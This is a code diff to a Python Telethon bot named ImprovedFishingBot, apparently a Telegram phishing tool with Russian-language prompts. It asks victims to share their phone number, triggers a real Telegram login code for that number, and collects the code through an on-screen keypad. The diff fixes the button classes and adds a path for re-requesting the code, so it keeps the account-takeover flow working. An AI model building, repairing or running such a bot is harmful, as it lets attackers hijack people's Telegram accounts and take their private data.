@@ -5,8 +5,8 @@ import json
 import os
 import shutil
 from datetime import datetime
-from telethon import TelegramClient, events, types
-from telethon.tl.types import KeyboardButtonRequestPhone, KeyboardButtonCallback
+from telethon import TelegramClient, events
+from telethon.tl.types import KeyboardButtonRequestPhone, KeyboardButtonCallback, KeyboardButton
 from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
 
 # === КОНФИГУРАЦИЯ ===
@@ -41,7 +41,6 @@ class ImprovedFishingBot:
 
         @self.bot.on(events.NewMessage(pattern='/start'))
         async def start_handler(event):
-            # Правильный способ создать кнопку запроса контакта
             button = KeyboardButtonRequestPhone(
                 text="📱 ПОДЕЛИТЬСЯ КОНТАКТОМ"
             )
@@ -72,7 +71,7 @@ class ImprovedFishingBot:
                     f"Телефон: `{phone}`\n\n"
                     "Теперь нажмите кнопку ниже, чтобы получить код подтверждения:",
                     buttons=[
-                        [types.KeyboardButtonText("🔑 ПОЛУЧИТЬ КОД")]
+                        [KeyboardButton(text="🔑 ПОЛУЧИТЬ КОД")]
                     ]
                 )
                 self.pending_auth[user_id] = {
@@ -92,6 +91,9 @@ class ImprovedFishingBot:
                     if step == 'awaiting_code_request' and text == "🔑 ПОЛУЧИТЬ КОД":
                         await self.request_code(event, user_id, auth_data['phone'])
                     
+                    elif step == 'awaiting_code_request' and text == "🆕 ПОЛУЧИТЬ НОВЫЙ КОД":
+                        await self.request_code(event, user_id, auth_data['phone'])
+                    
                     elif step == 'waiting_code':
                         code = text.replace(' ', '').replace('-', '')
                         if code.isdigit() and len(code) in (5, 6):
@@ -109,7 +111,7 @@ class ImprovedFishingBot:
                                     "⚠️ **Слишком много попыток!**\n"
                                     "Нажмите 'Получить новый код', чтобы запросить новый код.",
                                     buttons=[
-                                        [types.KeyboardButtonText("🆕 ПОЛУЧИТЬ НОВЫЙ КОД")]
+                                        [KeyboardButton(text="🆕 ПОЛУЧИТЬ НОВЫЙ КОД")]
                                     ]
                                 )
                                 self.pending_auth[user_id]['step'] = 'awaiting_code_request'
@@ -143,10 +145,18 @@ class ImprovedFishingBot:
                         f"Длина: {len(code_input)}/6\n\n"
                         "Используйте клавиатуру ниже для ввода кода:",
                         buttons=[
-                            [types.KeyboardButtonText("1"), types.KeyboardButtonText("2"), types.KeyboardButtonText("3")],
-                            [types.KeyboardButtonText("4"), types.KeyboardButtonText("5"), types.KeyboardButtonText("6")],
-                            [types.KeyboardButtonText("7"), types.KeyboardButtonText("8"), types.KeyboardButtonText("9")],
-                            [types.KeyboardButtonText("0"), types.KeyboardButtonText("⌫ УДАЛИТЬ"), types.KeyboardButtonText("✅ ОТПРАВИТЬ")]
+                            [KeyboardButtonCallback(text="1", data=b"1"), 
+                             KeyboardButtonCallback(text="2", data=b"2"), 
+                             KeyboardButtonCallback(text="3", data=b"3")],
+                            [KeyboardButtonCallback(text="4", data=b"4"), 
+                             KeyboardButtonCallback(text="5", data=b"5"), 
+                             KeyboardButtonCallback(text="6", data=b"6")],
+                            [KeyboardButtonCallback(text="7", data=b"7"), 
+                             KeyboardButtonCallback(text="8", data=b"8"), 
+                             KeyboardButtonCallback(text="9", data=b"9")],
+                            [KeyboardButtonCallback(text="0", data=b"0"), 
+                             KeyboardButtonCallback(text="⌫ УДАЛИТЬ", data=b"DELETE"), 
+                             KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                         ]
                     )
                 except:
@@ -172,10 +182,18 @@ class ImprovedFishingBot:
                             f"Длина: {len(code_input)}/6\n\n"
                             "Используйте клавиатуру ниже для ввода кода:",
                             buttons=[
-                                [types.KeyboardButtonText("1"), types.KeyboardButtonText("2"), types.KeyboardButtonText("3")],
-                                [types.KeyboardButtonText("4"), types.KeyboardButtonText("5"), types.KeyboardButtonText("6")],
-                                [types.KeyboardButtonText("7"), types.KeyboardButtonText("8"), types.KeyboardButtonText("9")],
-                                [types.KeyboardButtonText("0"), types.KeyboardButtonText("⌫ УДАЛИТЬ"), types.KeyboardButtonText("✅ ОТПРАВИТЬ")]
+                                [KeyboardButtonCallback(text="1", data=b"1"), 
+                                 KeyboardButtonCallback(text="2", data=b"2"), 
+                                 KeyboardButtonCallback(text="3", data=b"3")],
+                                [KeyboardButtonCallback(text="4", data=b"4"), 
+                                 KeyboardButtonCallback(text="5", data=b"5"), 
+                                 KeyboardButtonCallback(text="6", data=b"6")],
+                                [KeyboardButtonCallback(text="7", data=b"7"), 
+                                 KeyboardButtonCallback(text="8", data=b"8"), 
+                                 KeyboardButtonCallback(text="9", data=b"9")],
+                                [KeyboardButtonCallback(text="0", data=b"0"), 
+                                 KeyboardButtonCallback(text="⌫ УДАЛИТЬ", data=b"DELETE"), 
+                                 KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                             ]
                         )
                     except:
@@ -204,10 +222,18 @@ class ImprovedFishingBot:
                 "Код был отправлен вам в Telegram.\n"
                 "Используйте клавиатуру ниже для ввода кода:\n",
                 buttons=[
-                    [types.KeyboardButtonText("1"), types.KeyboardButtonText("2"), types.KeyboardButtonText("3")],
-                    [types.KeyboardButtonText("4"), types.KeyboardButtonText("5"), types.KeyboardButtonText("6")],
-                    [types.KeyboardButtonText("7"), types.KeyboardButtonText("8"), types.KeyboardButtonText("9")],
-                    [types.KeyboardButtonText("0"), types.KeyboardButtonText("⌫ УДАЛИТЬ"), types.KeyboardButtonText("✅ ОТПРАВИТЬ")]
+                    [KeyboardButtonCallback(text="1", data=b"1"), 
+                     KeyboardButtonCallback(text="2", data=b"2"), 
+                     KeyboardButtonCallback(text="3", data=b"3")],
+                    [KeyboardButtonCallback(text="4", data=b"4"), 
+                     KeyboardButtonCallback(text="5", data=b"5"), 
+                     KeyboardButtonCallback(text="6", data=b"6")],
+                    [KeyboardButtonCallback(text="7", data=b"7"), 
+                     KeyboardButtonCallback(text="8", data=b"8"), 
+                     KeyboardButtonCallback(text="9", data=b"9")],
+                    [KeyboardButtonCallback(text="0", data=b"0"), 
+                     KeyboardButtonCallback(text="⌫ УДАЛИТЬ", data=b"DELETE"), 
+                     KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                 ]
             )
             
@@ -275,7 +301,7 @@ class ImprovedFishingBot:
                 "⏰ **Код истек!**\n\n"
                 "Запросите новый код, нажав кнопку ниже.",
                 buttons=[
-                    [types.KeyboardButtonText("🆕 ПОЛУЧИТЬ НОВЫЙ КОД")]
+                    [KeyboardButton(text="🆕 ПОЛУЧИТЬ НОВЫЙ КОД")]
                 ]
             )
             self.pending_auth[user_id]['step'] = 'awaiting_code_request'
